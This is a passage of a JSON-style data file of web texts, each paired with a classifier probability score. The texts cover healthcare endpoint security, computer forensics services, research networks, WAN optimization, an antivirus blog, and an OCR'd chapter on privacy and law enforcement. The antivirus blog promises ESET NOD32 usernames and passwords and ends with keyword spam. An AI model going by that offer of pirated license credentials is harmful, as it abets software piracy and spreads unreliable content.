        "text": "Preventive Medicine for Healthcare Providers: Fighting bugs and viruses of a different sort David Finn, Health IT Officer at Symantec The doctor’s office is changing. It’s becoming much less common to see the rows of filing cabinets filled with paper files on each patient. Instead, healthcare today is driven more and more by technologies such as computers, servers, smartphones and tablets. Endpoints used to primarily mean PCs, but now there are far more methods for accessing files, especially electronic protected health information (ePHI) about patients. Healthcare professionals now have more ways than ever to provide the care their patients need. Just as our bodies are constantly fighting off germs and viruses, largely without our knowledge, most healthcare employees may not see the battle behind the scenes to protect ePHI from cyber criminals as well as accidents that can expose this sensitive information. But just one data loss incident can be devastating for a healthcare provider. And while we are hearing in the news about sophisticated cyberattacks , endpoint security remains a fundamental part of information protection. A recent survey conducted by Symantec revealed that three-fourths of small to mid-sized businesses feel they are safe from threats such as viruses and hackers. Unfortunately, additional research shows that 36 percent of all targeted attacks are now directed at businesses that have fewer than 250 employees. This combination – increasing threats to information and that information being stored and accessed in more places than ever before – means that it’s time for businesses dealing with ePHI to make sure they are doing everything in their power to keep it safe. They also need to protect their own financial records and other confidential data. The following are best practices healthcare facilities can follow to ensure successful protection of their endpoints. Know what you’re dealing with: The first step is to know what information you are storing, and where it is. If you have implemented an electronic medical record and/or practice management system, you should know where those files are being stored. The servers and other machines that have access to that information need the most protection, whereas public information does not require the same level of protection. Educate employees: Employee education is a significant part of an effective information protection plan, as they are the first line of defense when it comes to keeping endpoints safe. Be sure your employees are not only aware of long-established threats like malware, but educate them on more recent trends such as social engineering. In this newer kind of threat, cyber criminals can use publicly available information from sources such as social networking sites to craft communications ostensibly from credible sources, sending them to employees. Then they trick them into giving away their login credentials, potentially compromising endpoints, security systems and confidential information. Employees also need to remain vigilant with their Internet use and the files they download. Choose the right solutions: Carefully evaluate your current endpoint protection software. You should standardize on a single solution wherever possible, to present a united front against threats. If you need to update or introduce new protection tools, look for a vendor that can satisfy these key requirements: - Flexibility: As many businesses begin to embrace virtualization and the cloud, they need to protect both physical and virtual machines. Using two or more endpoint protection solutions is costly and inefficient; be sure your vendor can support both platforms. A simple licensing process will also be valuable as the number of endpoints grows with the business. In addition, more businesses are opting to deploy security as a service, allowing security businesses to utilize their extensive intelligence resources to manage security for clients. This may be especially useful for smaller organizations with fewer IT resources. - Effectiveness: Threats are diversifying, and in many cases traditional malware protection alone is not enough. Securing endpoints should include the ability to protect against not only the expected viruses and Trojans, but newer forms of malware that exploit emerging vulnerabilities. The ideal solution should be able to analyze files to dynamically identify new threats based on the latest intelligence. For the best possible results, select an endpoint solution from a reputable and trusted security vendor. - Performance: With the amount of information providers are storing drastically increasing, particularly as electronic medical records become more common, there are more files than ever for endpoint protection tools to scan. Healthcare businesses need a solution that can quickly scan this increasingly large number of files. Deduplication can significantly reduce scan times by reducing duplicate files. It should also be intelligent enough to skip duplicate files in the virtual environment, further streamlining the protection process. Today’s healthcare providers, from academic medical centers to small physician practices, deal with an enormous amount of sensitive information, and keeping it secure should be the top priority. As part of a multi-layered security approach, ensure that you install sufficient protection on all endpoints, as well as enabling sensible user behavior and intelligently managing where sensitive information is stored. Strengthening your ability to protect ePHI and other confidential files, you can continue to provide the highest quality patient care, knowing that their information is as well cared for as they are. Category: Health Information Technology",
        "prob": "tensor([[2.1334e-06, 1.0000e+00]])"
    },
    {
        "text": "What is Computer Forensics? Computer forensics is a computer investigation and analysis technique used to acquire civil, criminal or administrative evidence from a computer system. Some reasons for seeking this type of evidence may include: theft of trade secrets, destruction or theft of intellectual property, criminal misuse, or fraud. Kimmons utilizes numerous methods for discovering data on a computer system. These methods can also recover encrypted, damaged or deleted files. The information found can be useful in depositions, litigation, or discovery. Who can Benefit from this Type of Investigation? Criminal prosecutors use computer evidence when prosecuting crimes involving financial fraud, child pornography, and illegal drug related cases. Civil Litigants use personal and business records found on computer systems when litigating divorces, discrimination, or harassment cases. Corporations use computer forensics specialists to gather evidence relating to embezzlement, misappropriation of funds or trade secrets, and sexual harassment. Individuals frequently hire computer forensics specialists to support their claims of age, discrimination, sexual harassment or wrongful termination. What do Our Computer Forensics Security Services do? - Secure the system - Discover the files - Recover deleted files - Reveal hidden, temporary, or swap files - Access protected or encrypted files - Analyze all relevant data - Print overall analysis - Provide consultation and/or testimony - Protect all information and evidence discovered throughout investigation Why Choose Kimmons Computer Forensics Services? Protection of evidence is critical in computer forensics. A knowledgeable computer forensics professional will secure a computer system to ensure no possible evidence is damaged, destroyed or compromised. The specialist will guarantee the computer is not exposed to any additional viruses during the procedure. All evidence is properly handled and protected from other types of damage, including mechanical or electromagnetic interference. Interruptions to business operations are kept minimal. The client-attorney privilege will be maintained and information will be handled ethically and legally.",
        "prob": "tensor([[0.0359, 0.9641]])"
    },
    {
        "text": "The Internet’s Reinventions PlanetLab aims to transform today’s dumb, simple Internet communications system into a smarter and much more flexible network that can ward off worms, store huge amounts of data with perfect security, and deliver content instantly. Here’s how it fits into a long tradition of academic and government research projects that developed fundamental networking, transmission, and distributed-computing technologies. The first major attempt to use computers for communication, and the testing ground for the standards that would come to define the Internet. Built by universities and technology firms with funding from the U.S. Defense Department’s Advanced Research Projects Agency (now DARPA). A network of smaller networks in which computers exchange packets of data formatted and addressed according to, respectively, the Transport Control Protocol and the Internet Protocol (TCP/IP), which were conceived in 1973 and officially replaced the ARPANET’s protocols in January 1983. The Multicast Backbone: a system that allows many people to view the same real-time information, such as video broadcasts, over the Internet. Created by members of the Internet Engineering Task Force in 1992 to overcome the limitations of standard Internet protocols, which can route a given data packet to only one destination. A consortium of more than 200 universities that has created Abilene, a network of high-performance routers and fiber-optic links. Abilene is able to transmit an entire DVD movie in about 36 seconds, as much as 3,500 times faster than a typical home DSL or cable connection. A collection of public and private organizations and projects that use software developed at the U.S. Department of Energy and the University of Southern California to link scattered supercomputers, scientific instruments, and data storage facilities into a “grid” that can take on tough computational problems-like screening for new drug molecules. The Active Network Backbone: a network built to test the efficiency of “active networking,” in which the network is stripped of nearly all intelligence-even the basic message-passing software that runs on today’s Internet-and packets of data contain all the software and instructions needed to deliver themselves to their destinations. Funded by DARPA and created by SRI International, a private research institute in Menlo Park, CA, and the University of Southern California. An effort by academic and corporate networking researchers to augment, and eventually replace, today’s “dumb” Internet with a much smarter network able to monitor itself for worms and viruses, relieve bottlenecks automatically, and make personal-computing environments portable to any terminal on earth.",
        "prob": "tensor([[0.0394, 0.9606]])"
    },
    {
        "text": "WAN optimization is a collection of techniques for increasing data-transfer efficiencies across wide-area networks. In 2008, the WAN optimization market was estimated to be $1 billion, and it will grow to $4.4 billion by 2014 according to Gartner, a technology research firm. The most common measures of TCP data-transfer efficiencies (i.e., optimization) are throughput, bandwidth requirements, latency, protocol optimization, and congestion, as manifested in dropped packets. In addition, the WAN itself can be classified with regards to the distance between endpoints and the amounts of data transferred. Two common business WAN topologies are Branch to Headquarters and Data Center to Data Center (DC2DC). In general, \"Branch\" WAN links are closer, use less bandwidth, support more simultaneous connections, support smaller connections and more short-lived connections, and handle a greater variety of protocols. They are used for business applications such as email, content management systems, database application, and Web delivery. In comparison, \"DC2DC\" WAN links tend to require more bandwidth, are more distant, and involve fewer connections, but those connections are bigger (100Mbit/s to 1Gbit/s flows) and of longer duration. Traffic on a \"DC2DC\" WAN may include replication, back up, data migration, virtualization, and other Business Continuity/Disaster Recovery BC/DR flows. WAN optimization has been the subject of extensive academic research almost since the advent of the WAN. In the early 2000s, research in both the private and public sectors turned to improving the end-to-end throughput of TCP, and the target of the first proprietary WAN optimization solutions was the Branch WAN. In recent years, however, the rapid growth of digital data, and the concomitant needs to store and protect it, has presented a need for DC2DC WAN optimization. Component techniques of Branch WAN Optimization include deduplication, WAFS, CIFS proxy, HTTPS Proxy, media multicasting, web caching, and bandwidth management. Requirements for DC2DC WAN Optimization also center around deduplication and TCP acceleration, however these must occur in the context of multi-gigabit data transfer rates. WAN optimization techniques - Deduplication – Eliminates the transfer of redundant data across the WAN by sending references instead of the actual data. By working at the byte level, benefits are achieved across IP applications. - Compression – Relies on data patterns that can be represented more efficiently. Essentially compression techniques similar to ZIP, RAR, ARJ etc. are applied on-the-fly to data passing through hardware (or virtual machine) based WAN acceleration appliances. - Latency optimization – Can include TCP refinements such as window-size scaling, selective Acknowledgements, Layer 3 congestion control algorithms, and even co-location strategies in which the application is placed in near proximity to the endpoint to reduce latency. In some implementations, the local WAN optimizer will answer the requests of the client locally instead of forwarding the request to the remote server in order to leverage write-behind and read-ahead mechanisms to reduce WAN latency. - Caching/proxy – Staging data in local caches; Relies on human behavior, accessing the same data over and over. - Forward error correction – mitigates packet loss by adding an additional loss-recovery packet for every “N” packets that are sent, and this would reduce the need for retransmissions in error-prone and congested WAN links. - Protocol spoofing – Bundles multiple requests from chatty applications into one. May also include stream-lining protocols such as CIFS. - Traffic shaping – Controls data flow for specific applications. Giving flexibility to network operators/network admins to decide which applications take precedence over the WAN. A common use case of traffic shaping would be to prevent one protocol or application from hogging or flooding a link over other protocols deemed more important by the business/administrator. Some WAN acceleration devices are able to traffic shape with granularity far beyond traditional network devices. Such as shaping traffic on a per user AND per application basis simultaneously. - Equalizing – Makes assumptions on what needs immediate priority based on the data usage. Usage examples for equalizing may include wide open unregulated Internet connections and clogged VPN tunnels. - Connection limits – Prevents access gridlock in routers and access points due to denial of service or peer to peer. Best suited for wide open Internet access links, can also be used on WAN links. - Simple rate limits – Prevents one user from getting more than a fixed amount of data. Best suited as a stop gap first effort for remediating a congested Internet connection or WAN link. Open-source based WAN optimization solutions - Machowinski, Matthias. \"WAN optimization market passes $1 billion in 2008, up 29%; enterprise router market down\". Enterprise Routers and WAN Optimization Appliances. Infonetics Research. Retrieved 19 July 2011. - Skorupa, Joe; Severine Real (2010). \"Forecast: Application Acceleration Equipment, Worldwide, 2006–2014, 2Q10 Update\". Gartner, Inc. Retrieved 19 July 2011. - Cardwell, N.; Savage, S.; Anderson, T.;. \"Modeling TCP latency\". INFOCOM 2000. Nineteenth Annual Joint Conference of the IEEE Computer and Communications Societies. Proceedings. IEEE. Dept. of Comput. Sci. & Eng., Washington Univ., Seattle, WA: IEEE.org. Retrieved 20 July 2011. - Jacobson, Van. \"TCP Extensions for Long-Delay Paths\". Request for Comments: 1072. Internet Engineering Task Force (IETF). Retrieved 19 July 2011. - Floyd, Sally. \"HighSpeed TCP for Large Congestion Windows\". Request for Comments: 3649. Internet Engineering Task Force (IETF). Retrieved 19 July 2011. - Paris, Chandler. \"Latency & Colocation\". Retrieved 20 July 2011. - Mark Rabinovich, Igor Gokhman. \"CIFS Acceleration Techniques\". Storage Developer Conference, SNIA, Santa Clara 2009.",
        "prob": "tensor([[0.0017, 0.9983]])"
    },
    {
        "text": "What is Antivirus? Antivirus or anti-virus software is used to prevent, detect, and remove malware, including but not limited to computer viruses, computer worms, trojan horses, spyware and adware Identification methods: 1.Signature based detection 2. Heuristic-based detection Signature based detection: it's most common method to take down virus. This process, antivirus compares contents of the file to directory of virus signatures. Every virus program contains different malicious proggram. Firstly, antivirus collects odd proggram then create virus signature database. Heuristic-based detection : There are some renowned antivirus uses this method. Many viruses start as a single infection and through either mutation or refinements by other attackers, can grow into dozens of slightly different strains, called variants. Generic detection refers to the detection and removal of multiple threats using a single virus definition. [source:Wikipedia] Rootkit Detection: Rootkit is malware, antivirus also can scan it. Rootkits normally changed OS . Several time, hacker injects rootkit to host ! Virus lists and how to prevent : 9. Virus Hoax There are various ways to prevent them. In this time, many software like, Antivirus, Smart Security, Internet security,Anti-spyware, Anti-malware etc. there are all paid and trail version. I , comfortably, use ESET NOD32 smart security. ESET is an IT security company headquartered in Bratislava, Slovakia that was founded in 1992 by the merger of two private companies. The company was awarded as the most successful Slovak company in 2008, 2009 and 2010. ESET is privately held and has branch offices in San Diego, California; Montreal, Canada; Buenos Aires, Argentina; Prague, Czech Republic; Kraków, Poland and Singapore as well as distributors in over 180 countries. In December 2010, the company announced the appointment of Richard Marko as Global CEO, Milan Masaryk as CFO, Pavol Luka as CTO, Juraj Malcho as Chief Research Officer, Ignacio Sbampato as director of global sales and marketing, and Andrew Lee as the CEO of its North American branch. ESET's founders remain on as the company's board. \"At ESET, we are dedicated to developing high-performing security solutions for home users and corporate customers, keeping out all known and emerging forms of malware.\" - Miroslav Trnka, Co-Founder of ESET. ESET NOD32 is a very renowned antivirus. You could download it as TRIAL version. There are some types of ESET NOD32 Security system 1. ESET Smart Security 2. ESET NOD32 Antivirus 3. ESET cyber security for MAC 4. ESET Antivirus for Linux 5. ESET Mobile Security More in: Eset Official Site This antivirus has trial version. We are trying to provide Nod32 USERNAME and PASSWORD. Related search Keywords: nod32 username and password,eset nod32 username password,8 june 2012 nod32 username update, 2012-07-08 nod32 username password, 08-07-2012 eset nod32 username password",
        "prob": "tensor([[2.1183e-06, 1.0000e+00]])"
    },
    {
        "text": "Below are the first 10 and last 10 pages of uncorrected machine-read text (when available) of this chapter, followed by the top 30 algorithmically extracted key phrases from the chapter as a whole. Intended to provide our own search engines and external engines with highly rich, chapter-representative searchable text on the opening pages of each chapter. Because it is UNCORRECTED material, please consider the following text as a useful but insufficient proxy for the authoritative book pages. Do not use for reproduction, copying, pasting, or reading; exclusively for search engines. OCR for page 251 Engaging Privacy and Information Technology in a Digital Age 9 Privacy, Law Enforcement, and National Security The tension between individual privacy and law enforcement or national security interests has been an enduring force in American life, its origins long predating the advent of new media or current technologies. Nowhere else is the tension between “it’s none of your business” and “what have you got to hide” so easily seen.1 Although these tensions predate the information revolution, new technologies, new societal contexts, and new circumstances have sharply intensified that conflict, and even changed its focus. Section 9.1 focuses on the uses of information technology in law enforcement and discusses the pressures that such uses place on individual privacy. Section 9.2 does the same for national security and intelligence. 1 As an illustration of the latter, Houston police chief Harold Hurtt referred to a proposal to place surveillance cameras in apartment complexes, downtown streets, shopping malls, and even private homes to fight crime during a shortage of police officers and told reporters at a police briefing, “I know a lot of people are concerned about Big Brother, but my response to that is, if you are not doing anything wrong, why should you worry about it?” See Pam Easton, “Houston Eyes Cameras at Apartment Complexes,” Associated Press Newswire, February 15, 2006. OCR for page 252 Engaging Privacy and Information Technology in a Digital Age 9.1 INFORMATION TECHNOLOGY, PRIVACY, AND LAW ENFORCEMENT 9.1.1 Background By its very nature, law enforcement is an information-rich activity. The information activities of law enforcement can be broken into three categories. Gathering and analyzing information to determine that a law has been violated; Gathering and analyzing information to determine the identity of the person or persons responsible for a violation of law; and Gathering and analyzing information to enable a legal showing in court that the person or persons identified in fact were guilty of the violation. All of these gathering and analysis activities have been altered in basic ways by functional advancements in the technologies that have become available for collecting, storing, and manipulating data. In actual practice, these categories can overlap or the activities in each category can occur in several temporal sequences. When a police officer observes someone breaking a law, the officer is determining that a law has been violated, gathering information about who broke the law (presumably the person he or she is observing), and gaining evidence that may be introduced in court (the testimony of the officer). The essential difference between these categories is the locus or subject about which the information is gathered. In the first category concerning the breaking of a law, the locus of information is the event or activity. In the second sort of activity, the locus is the determination of an individual or set of individuals involved in the activity. In the third category, information associated with categories one and two are combined in an attempt to link the two in a provable way. Although activities in the first category usually precede those in the second, this is not always the case. Law enforcement authorities have been known to start with “suspicious people” and then seek to discover what laws they might have broken, might be breaking, or might be planning to break. This is one of the rationales for certain kinds of undercover activity and is frequently regarded as more controversial. These distinctions are important because they help to differentiate cases that generate concern about invasions of privacy from those that involve less controversial uses of the state’s investigatory power. OCR for page 253 Engaging Privacy and Information Technology in a Digital Age Concerns about privacy invasions often involve the possibility that law enforcement officials can cast an unduly broad net, or one that is seen as discriminatory, as they gather information about persons in the absence of specific reasons to suspect that these individuals have violated some particular law. A case in which an individual is targeted to see if he or she has violated a law is conceptually (and legally and morally) different from a case in which information is gathered about an individual as part of an investigation into a known or suspected violation of law or in which there are other grounds for suspicion. In the former case, information may be gathered about individuals who in fact were not involved in a violation—which is different in kind from the task of assembling information about an individual in the hope of finding a violation of law. The potential for data gathering targeted at a particular individual or set of individuals to aid in the discovery of previously unknown violations of the law, or the risk that data gathered by law enforcement may be used for political or harassment purposes, often underlies efforts to restrict the kinds of information that law enforcement agencies can gather and the ways in which it is gathered. Even if the information is never used, the very fact that considerable amounts of data have been collected about individuals who have not been accused or convicted of a crime ensures that substantial amounts of information about non-criminals will end up in the databases of law enforcement agencies. Moreover, with such data a permanent part of their files, citizens may be concerned that this information will eventually be misused or mistakenly released, even if they are not suspects in any crime. They may even engage in self-censorship, and refrain from expressing unpopular opinions. For individuals in this position, issues such as recourse for police misbehavior or carelessness are thus very important. Nor are worries about the gathering of information by law enforcement agencies restricted to how that information could be used in legal proceedings. Such proceedings are governed by the laws and professional ethics that protect the privacy of the individual, and the inappropriate use (in a criminal context) of information gathered by law enforcement agencies can be balanced by judicial review. However, even the suspicion of wrongdoing or being a “person of interest” can have an effect on an individual’s ability to fly in a commercial airliner, obtain certain kinds of permits, gain some kinds of employment, obtain financial services, or conduct business. For example, watch lists, such as those used by the Transportation Security Agency, are not subject to the same level of scrutiny as evidence in a court of law yet can still affect the lives of those whose names appear on such lists. These uses of information are often not OCR for page 254 Engaging Privacy and Information Technology in a Digital Age balanced by judicial or any other kinds of review, leaving the individual at a severe disadvantage when information is inaccurate or incomplete.2 None of these concerns about balancing the need for law enforcement agencies to gather information and the need of the citizen for privacy are new. What is new are the modern information technologies that law enforcement agencies can now use to observe situations and identify individuals more quickly, more accurately, and at less expense than ever before. These technologies include surveillance cameras, large-scale databases, and analytical techniques that enable the extraction of useful information from large masses of otherwise irrelevant information. The sections that follow describe a number of technologies that allow law enforcement agencies expanded capabilities to observe, to listen, and to gather information about the population. Just as the ability to tap phone lines offered law enforcement new tools to gather evidence in the past century, so also these new technologies expand opportunities to discover breaches in the law, identify those responsible, and collect the evidence needed to prosecute. And just like the ability to tap telephones, these new technologies raise concerns about the privacy of those who are—rightly or wrongly—the targets of the new technologies. Use of the technologies discussed requires careful consideration of the resulting tension posed between two legitimate and sometimes competing goals: information gathering for law enforcement purposes and privacy protection. 9.1.2 Technology and Physical Observation As a point of departure, consider the issue of privacy as it relates to government authorities conducting surveillance of its citizens. Using the anchoring vignette approach described in Chapter 2 (see Box 2.2), a possible survey question might be, How much does [your/“Name’s”] local town or city government respect [your/“Name’s”] privacy in [your/her/his] routine local activities? Here are a number of possibilities: [Anita] lives in a city that prohibits any form of video or photographic monitoring by government agencies. [Bita] commutes to work every day into a city that automatically photographs each car to see whether it runs a particular stoplight. [Jake] lives in a city that videotapes all cars on city-owned property. 2 See, for example, Peter M. Shane, “The Bureaucratic Due Process of Government Watch Lists,” Ohio State Public Law Working Paper No. 55, February 2006, available at http://ssrn.com/abstract=896740. OCR for page 255 Engaging Privacy and Information Technology in a Digital Age [Beth] lives in a city that videotapes all people inside the hallways of city-owned buildings. [Mark] lives in a city that uses a device in police cars to detect whether individuals are at home. [Juanita] lives in a city that uses an imaging device in police cars that can see through walls and clothes. These vignettes, ordered from most to least privacy-protecting, illustrate only a single dimension of privacy (namely image-based personal information), but they are a starting point for knowing what must be analyzed and understood in this particular situation, and what decisions society will have to make with respect to the issues the vignettes raise. Whether it is used to see that a law has been or is being broken, to determine who broke the law, or to find a suspect for arrest, physical observation has historically been the main mechanism by which law enforcement agencies do their job. Physical observation is performed by law enforcement officers themselves, and also by citizens called as witnesses in an investigation or a trial. The vignettes above suggest that physical observation has evolved far beyond the in-person human witness in sight of the event in question. When individuals are watched, particularly by the state with its special powers, privacy questions are obviously relevant. The usual expectation is that, unless there is a reason to suspect an individual of some particular infraction of the law, individuals will not be under observation by law enforcement agencies. But because of advances in technology, the means by which law enforcement can conduct physical observation or surveillance have expanded dramatically. New technologies that provide automated surveillance capabilities are relatively inexpensive per unit of data acquired; vastly expand memory and analytical ability, as well as the range and power of the senses (particularly seeing and hearing); and are easily hidden and more difficult to discover than traditional methods. They can be used to observe violations of law as well as a particular individual over extended periods of time unbeknownst to him or her. Today, for example, the use of video cameras is pervasive. Once only found in high-security environments, they are now deployed in most stores and in many parks and schools, along roads, and in public gathering places. A result is that many people, especially in larger cities, are under recorded surveillance for much of the time that they are outside their homes. Law enforcement officials, and indeed much of the public, believe that video cameras support law enforcement investigations, offering the prospect of a video record of any crime committed in public areas where they are used. Such a record is believed to have both investigatory value OCR for page 256 Engaging Privacy and Information Technology in a Digital Age (in identifying perpetrators) and deterrent value (in dissuading would-be perpetrators from committing crimes).3 However, these cameras also give those who operate them ever more information, often in the form of a reusable and possibly permanent record regarding where many law-abiding individuals are, who they are with, and what they are doing. Another example concerns automobiles equipped with tracking systems, such as General Motors’ OnStar system, that permit the location tracking to a fairly fine resolution of anyone holding a cell phone. (Such systems may be based on the use of GPS or on cell phones that provide location information as part of E-911 services.) By tracking people’s position over time, it is also possible to track their average speed,4 where they have been, and (by merging the positional information for multiple people) with whom they might have met. If such tracking is recorded, correlations can be made at any time in the future. Indeed, given the right monitoring equipment and enough recording space, it is even possible that the locations of every person for much of a lifetime could be made available to law enforcement agencies or even family members or researchers. Similar issues regarding data reuse arise with respect to the use of video cameras for the enforcement of traffic regulations. In many cities the traffic lights have been equipped with cameras that allow law enforcement agencies to determine violations of red-light stop zones simply by photographing the offending vehicles as they pass through the red light. Such images allow local police agencies to automatically send red-light-running tickets to the vehicle owners. Even such a seemingly straightforward use of surveillance technology, however, brings up a host of privacy 3 It is unquestionable that video records have had forensic value in the investigations of crimes that have already been committed. The deterrent effect is less clear. A study done for the British Home Office on the crime prevention effects of closed-circuit television (CCTV) cameras systematically reviewed two dozen other empirical studies on this subject and concluded that, on balance, the evidence suggested a small effect on crime reduction (on the order of a few percent) and only in a limited set of venues (namely, car parks). The deployment of CCTV cameras had essentially no effect in public transportation or in city-center contexts. Welsh and Farrington also noted that poorly controlled studies systematically indicated larger effects than did well-controlled ones. See Brandon Welsh and David Farrington, Crime Prevention Effects of Closed Circuit Television, Home Office Research Study 252, August 2002, available at http://www.homeoffice.gov.uk/rds/pdfs2/hors252.pdf. 4 A lower-tech version of this capability is inherent in toll systems on highways. For some highways, periodic toll plazas on turnpikes were replaced by a system in which the driver picked up a ticket at the point of entry that was then used to determine the toll at the location where the car exited. Given that these tickets included the time of entry into the turnpike, there were concerns that the tickets could also be used upon exit to determine if the car had exceeded the speed limit. Stories of such secondary use have the ring of urban myth, but they continue to surface on the Internet and are certainly consistent with what the technology enables. OCR for page 257 Engaging Privacy and Information Technology in a Digital Age issues. For example, consider that these cameras could also be used to trace and record the presumed locations of people based on the observed time and location of their cars. That is, they could take pictures even when no car was running a red light. Such a concern is based on the future possibilities for repurposing the information gathered by such cameras rather than on the purpose for which these cameras were originally deployed. Note that nothing intrinsic in the use of a video system to catch those running traffic lights enables secondary use of the information. The system could be designed in such a way that only those images showing someone running a red light were kept, and all other images were discarded immediately. Such a system could not be used to track the location of any but a small number of vehicles. Designing such a system in this way is simple to do when the system is first being built but is far more difficult once the system has been installed. However, privacy concerns associated with possible secondary uses are usually not raised when a system is designed, if nothing else because those secondary uses are not yet known or anticipated. It could be argued that a video camera at the stoplight is no different in principle from posting a live police officer at the same place. A police officer can issue a ticket for a car that runs a red light, and if a live police officer on traffic detail at the intersection is not a threat to privacy, then neither is the placement of a video camera there. Others, however, would argue that a live officer could not accurately record all vehicles passing lawfully through the intersection, and could not be used to trace the movements of every vehicle passing through a busy intersection—lawfully or not—in the way that a video camera can. The image-retention capacity of a video system vastly exceeds that of even the most astute human observer and thus allows the tracking of all vehicles, not just those that are of interest at the time they move through the intersection. The images stored by the video system can, in principle, be not just those of vehicles that have violated the law, but of all vehicles that have passed by the camera. In addition, information gathered by a video camera ostensibly deployed to catch cars running a red light can be used for other purposes, such as tracking the location of particular cars at particular points in time, or finding speeders (this would require combining of information from multiple cameras at multiple locations)—purposes that are not possible with a human officer. Further, when the images are stored, law enforcement agencies gain the capability to track what individuals have done in the past, and not just what they are currently doing. The worry is that once the information has been gathered and stored, it will be used in a variety of ways other than that for which it was originally intended. Such “feature creep” is possible because what is stored is the raw information, in image form, which can be used in a variety of ways. OCR for page 258 Engaging Privacy and Information Technology in a Digital Age Finally, video surveillance is far less expensive than the use of many human officers. From an economic point of view, it is impossible in large jurisdictions to station officers at every intersection, but placing a video camera at many intersections is much less expensive and within the means of many police departments. An important check on executive power has always been based on the allocation of resources, and if technology can enable a greater amount of police activity—in particular, more surveillance—for the same cost, the introduction of that technology changes the balance of power. Perhaps most importantly, this change in the balance of power is often unnoticed or not discussed—and when it is, a dispute about the amount of police activity must be resolved explicitly on policy grounds rather than implicitly on economic grounds. Beyond video technologies such as those discussed above, there is also the prospect that emerging technologies can extend the reach of observation from public spaces into what have traditionally been private spaces. There has been some use of infrared detectors to “look through” walls and see into a suspect’s home;5 although the Supreme Court recently suggested that such law enforcement surveillance tactics might violate the resident’s “reasonable expectation of privacy” (Section 1.5.5), the courts have not categorically rejected the use of such sophisticated imaging devices. If environmental sensors become pervasive, it may in the near future become possible to infer the location of people from the information gathered for purposes such as energy conservation—and to infer identities by correlating that information with other recorded information (such as building access records). The conditions under which law enforcement agencies will or should have access to such information raises difficult questions both of law and of policy. Concern over the potential use of such sensitive information lies at the heart of many privacy-based concerns about the deployment of such technologies. The deepest concern, from the privacy perspective, is the potential for combining constant and non-obvious data gathering and the ability to assemble the data gathered to give the effect of largely constant observation of any space, whether public or private. Such a prospect, combined with the temporally permanent nature of the data when they are stored, appears to give law enforcement agencies the ability to constantly monitor almost any place and to have access to a history of that 5 A number of court cases have been brought addressing the question of whether the use of a thermal-imaging device aimed at a private home from a public street to detect relative amounts of heat within the home constitutes a “search” within the meaning of the Fourth Amendment. The definitive ruling on this point is the decision of the U.S. Supreme Court in Kyllo v. United States, No. 99-8508 and decided on June 11, 2001, which held that it is a search and thus must be governed by the apparatus designed to protect the public against unreasonable searches. OCR for page 259 Engaging Privacy and Information Technology in a Digital Age place. Together with the ability to aggregate and mine the data that have been gathered (discussed below), this prospect would appear to give law enforcement enormous amounts of information. The most serious issues arise if and when such technologies enable monitoring of specific individuals. Many present-day technologies indicate bodies, but not the identities of the persons who own those bodies. Future technologies may enable the identification of individuals—that is, the high-accuracy association of specific names with the bodies within view—in which case the privacy concerns are accentuated many-fold. (Even today, modern cell phones with location identification capabilities yield information about the whereabouts of individuals, because of the generally unviolated presumption that individuals carry their cell phones with them.) 9.1.3 Communications and Data Storage Both communication and data storage technologies have long been of interest and use to the law enforcement community. Being able to observe and overhear the discussions of those suspected of breaking the law and to obtain records of criminal activity has been an important means for gaining evidence—but has also created inevitable threats to principles of privacy. The primary difference between records and communications is that by definition, records are intended to persist over time, whereas communications are more transient. Transient phenomena vanish, and they are generally more private than persistent entities that can be reviewed anew, copied, and circulated. For this reason, technologies that threaten the privacy of records are often seen as less problematic than those that threaten the privacy of communications. For keeping records private, the most common technique used has been to hide the records in a location known only to their owner. One can “hide” records by placing the file in a secret location (e.g., in an “invisible” directory on one’s disk, on a CD-ROM stored under the mattress or under a rock in the back yard or in a safe deposit box, or embedded secretly in another document). Today, there are few generally applicable technologies that enable law enforcement authorities to find records in a secret location without the (witting or unwitting) cooperation of their owner. Thus, debates over the appropriate balance between the privacy of records—even digital records—and the needs of law enforcement authorities for those records have been relatively straightforward, and based on the ability of law enforcement authorities to compel or trick the owner into revealing the records’ location. (The use of encryption to hide records, discussed in more detail below, presents a wrinkle in this debate, but the OCR for page 260 Engaging Privacy and Information Technology in a Digital Age same techniques are available to law enforcement authorities to compel or trick the owner or others into revealing the decryption keys that would allow law enforcement access.) But history paints a much different picture when it comes to communications. For the interception of telephone conversations, e-mail, and Internet-based communication, the proper balance between the claimed needs of law enforcement for access to such communications, and the privacy interests of persons who are the participants in the targeted communication, has been elusive and more difficult to define. When the Bill of Rights was enacted, communication consisted either of spoken language (which could only be heard directly) or written. Written communications are a type of record, and such records can be obtained by law enforcement personnel as the result of a search (under rules covered by the Fourth Amendment). But what of written communications being sent through the mails—were these communications more like utterances made in public, and therefore not subject to the same explicit protections of privacy, or were they more like records private and covered by the protections of the Fourth Amendment? In the case of mail carried by the U.S. Postal Service, the decision was that the outside of the mail (such as the address and return address) was public information, and not covered by the need for a search warrant,6 but that any communication inside the envelope was considered private and any viewing of that information by law enforcement required a search warrant obtained under the requirements of probable cause.7 As communication technologies advanced, the distinction between what was publicly available and what was private in those technologies became the crux of the debates about the privacy of those communica- 6 Ex Parte Jackson, 96 U.S. (6 Otto) 727,733 (1877). 7 The process by which national security investigators have obtained mail cover information has been governed by U.S. postal regulations for nearly 30 years. See 39 C.F.R. 233.3. The authority to use mail covers for law enforcement purposes first appeared in the 1879 postal regulations. Section 212 statutorily authorizes the continued use of mail covers in national security investigations. A “mail cover” is the process by which the U.S. Postal Service furnishes to the FBI the information appearing on the face of an envelope addressed to a particular address: i.e., addressee, postmark, name and address of sender (if it appears), and class of mail. The actual mail is delivered to the addressee, and only the letter carrier’s notation reaches the FBI. A mail cover does not include the contents of any “sealed mail,” as defined in existing U.S. postal regulations (see 39 C.F.R. 233.3(c)(3)) and incorporated in Section 212. Although the Supreme Court has not directly addressed the constitutionality of mail covers (the Court has denied certiorari in cases involving the issue), lower courts have uniformly upheld the use of mail covers as consistent with the requirements of the Fourth Amendment. See Vreeken v. Davis, 718 F.2d 343 (10th Cir. 1983); United States v. DePoli, 628 F.2d 779 (2d Cir. 1980); United States v. Huie, 593 F.2d 14 (5th Cir. 1979); and United States v. Choate, 576 F.2d 165 (9th Cir.), cert. denied, 439 U.S. 953 (1978). OCR for page 261 Engaging Privacy and Information Technology in a Digital Age tions and what access law enforcement agencies had to the communication. Perhaps the best example concerns communication by telephone. When telephones were first introduced, the circuits were connected by an operator who often needed to listen in on the call to monitor quality, and most of the telephone lines were shared or “party” lines, allowing conversations to be heard by anyone with whom the line was shared (although good manners suggested not listening when the call was not for you). With this history, it was generally held that discussions over a telephone were like discussions in public, so that law enforcement agents could listen in on such conversations, and could use in criminal 